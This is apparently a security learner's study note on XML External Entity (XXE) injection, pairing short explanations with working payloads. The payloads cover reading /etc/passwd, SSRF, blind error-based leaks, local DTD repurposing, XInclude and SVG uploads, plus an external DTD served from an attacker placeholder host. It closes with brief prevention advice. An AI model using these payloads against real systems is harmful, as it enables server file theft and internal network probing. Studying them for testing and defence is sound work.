
### General Notes

[[XML]] **eXternal Entity Injection**: Attackers exploit the usage of outdated [[XML]] parsers, and supply malicious input data to disclose local files stored in the backend.

Allows attacker to play with the application processing of [[XML]] data.
- Allows attacker to view files on server, and interact with the back-end or external systems.
- XXE attacks can be escalated to [[SSRF]] attacks.

This arises because some applications use XML format to transmit data between server and browser.
- Applications use [[Application Programming Interface (API)]]s to process [[XML]] data server-side.

> The external XML entity whose definition is loaded from outside the document where they are created can have its value changed, creating the attack.

---
### Retrieving Files

To perform an XXE Injection to retrieve files: 
1. Modify or add a `DOCTYPE` element that contains an external entity with the path to the file.
2. Edit the data value that is returned in the response in the application to be able to view the file contents.
``` XML
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>

<!-- somewhere in the application 
<> &ext; </>
```
- Somewhere in the application call on the external [[XML]] entity to view the file contents.
- Make sure that the location in which the entity is called has its output displayed in the response.

Sometimes the files we try to display are not in proper [[XML]] format that is supported by the parser.
- This can eb because they include special characters, like `< > &`.

**For PHP files only,** we can use the `filter` wrapper to base64 encode the files to display the content without breaking the parser.
- The output can then be decoded to understand the file.

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/path/to/filename.php">
]>

<!-- somewhere
<> &company; <>
```

##### Using CDATA

To display any type of file regardless if it contains any special characters, we can use the `CDATA` tag, which captures and displays the data as raw characters:

- **THIS DOESNT WORK**.
```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///path/to/file">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

However, this won't work because because internal and external references cannot be joined together.
- The solution is to use parameter entities, [[XML#XML Parameter Entity]], which are special entities that need to be used within a DTD.

What happens is: 
- The external DTD is fetched and processed by the [[XML]] parser.
- The parameter entities defined in this external DTD (e.g., `%begin;`, `%file;`, and `%end;`) are treated as external entities.
- The parser allows these entities to be combined into a single entity (e.g., `&joined;`), which contains the complete data (with the content wrapped in a CDATA section).

**To execute this attack, follow these steps:**
1. Define the DTD that will be referenced that joins the entities together:
```xml
<!-- file is called xxe.dtd -->

<!ENTITY joined "%begin;%file;%end;">
```

2. This file needs to be referenced, so we need to host it on our local machine and serve it, which can be done using a simple python server.
```bash
python3 -m http.server 8000
```
- needs to be done in the directory with the `xxe.dtd` file.

3. Now to reference the external DTD:
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> 
  <!ENTITY % file SYSTEM "file:///path/to/file">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>

<!-- Somewhere in the application -->
<>&joined;<>
```

---
### [[SSRF]] 

Similar to the Retrieving Files attack, but instead of specifying a path, we specify a URL we want the server to access.

```XML
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://internal.vulnerable-website.com" > ]>
```
- Causes the backend to make [[HTTP]] request to the given URL within the internal system.
- And then call it somewhere using `&ext;` to view the response of the HTTP request.

---
### Blind XXE

Happens when the application is vulnerable to XXE injection but doesn't return any values within the application response.

##### 1. Error Messages

Triggering error messages can be used to detect these vulnerabilities. 
- We can try changing the XML code such that it is syntactically incorrect, which may produce an error message.

Error messages can also be customized to return the required files in the response.
- An example of such a payload in an external DTD.
```XML
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>" >
%eval;
%error;
```

> Creating the dynamic parameter entity `error` uses `&#x25;` instead of `%`, the [[Web Encoding]] version.

1.  Create an [[XML]] parameter entity called `file` that contains the contents of the file `/etc/passwd`.
2.  Create an [[XML]] parameter entity called `eval`. In it is another parameter entity called `error`.
3. `error` intentionally loads a false file name, and passes the entity `file` as the file name using `%file;`.
4. `file` contains the contents of the `/etc/passwd` file, so the name of the file will be the contents of the file.
5. Finally, use the `eval` entity which declares the `error` entity and runs it. We then use the `error` entity to view its response.

This only works in external DTDs. Will not work in a normal `DOCTYPE` internal DTD.
- This is because having a parameter entity within the definition of another parameter entity is not tolerated by parsers.

> For it to work, we need to reference the external DTD, and use parameter entities for it to work.

- The DTD:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>" >
```

- The payload to be placed in the application.
```XMl
<!DOCTYPE foo [ 
	<!ENTITY % ext SYSTEM "URL" > 
	%ext;
	%eval;
]>
```
- Where `URL` is the location of the external DTD containing the payload.
- Can be done by running a python server and hosting the DTD file like in the CDATA section above to read files.

> Sometimes, this might not work, because special characters can break the parser.

##### 2. Repurposing a Local DTD

Finding loopholes in [[XML]] language specification.
- When a document has both internal and external DTDs, then we can redefine entities in the local DTD that are already declared in the external DTD.
- This relaxes the restriction on parameter entity definitions within each other. (error messages problem).

We can then use the error message technique within an internal DTD.
- We redefine an entity declared in the external DTD and declare it as an [[XML]] parameter entity.
- The external DTD, is loaded from a file on the server.

We invoke a DTD file on the system, and using it to redefine an existing entity to create an error with sensitive data leaked.

```XML
<!DOCTYPE foo [ 
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"> 
<!ENTITY % custom_entity ' 
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval; 
&#x25;error; 
'> 
%local_dtd; 
]>
```

1. Given an external DTD at location `/usr/local/app/schema.dtd` that has an entity called `custom_entity`.
2. We redefine the `custom_entity` to contain the error message payload as in the error message section.
3. We use the [[Web Encoding]] for special characters in recursive definitions of entities.
4. Finally, we call the `local_dtd` entity which triggers the error message.

> To locate the file and entity that we are going to replace, we can enumerate the files using error messages.

An example of an existing file in Linux GNOME desktop environments is `/usr/share/yelp/dtd/docbookx.dtd`.
- Testing for its presence.
```XML
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> 
%local_dtd; 
]>
```

Once we obtain the file, we can view it and then look for entities we can replace.
- Systems that include DTDs are usually open source, so we can find them on the internet.

---
### Finding XXE in Hidden Areas

##### 1. `XInclude`

Some data received by the server is embedded into an [[XML]] document and then parsed.
- A normal XXE attack can't be done as we cannot define or modify an XML document.

`XInclude` allows an [[XML]] document to be built from a sub-document.
- `XInclude` can be placed in any data value in an [[XML]] document.

To perform the attack, first reference `XInclude`, and then give it the path of the file that required.
```XML
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> 
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

##### 2. Attacks via File Upload

Some apps allow users to upload files that are processed on the server.
- Common file formats use [[XML]] or have some [[XML]], like `DOCX` and `SVG`.
- Malicious files can then be uploaded.

``` XML
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>

<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">

<text font-size="16" x="0" y="16">&xxe;</text>

</svg>
```

What this does is that creates an XML document and adds an entity `xxe` with the contents of the file `/etc/hostname`. Then, it creates an `svg` image with some properties and the required attributes. It then adds text inside the `svg` image, and its value is the contents of the file.

##### 3. Modified Content Type

Can reach hidden XXE attack surface by submitting [[XML]] in requests that can tolerate adding XML.

- Do this by changing the `content-type` header.
```
Content-Type: text/xml
```

---
### Preventing XXE

XML happens because the applications [[XML]] parser supports dangerous features, so to prevent attacks is to disable these features:
* Disable resolution of any external entity.
* Disable support for `XInclude`, and any other dangerous features.

---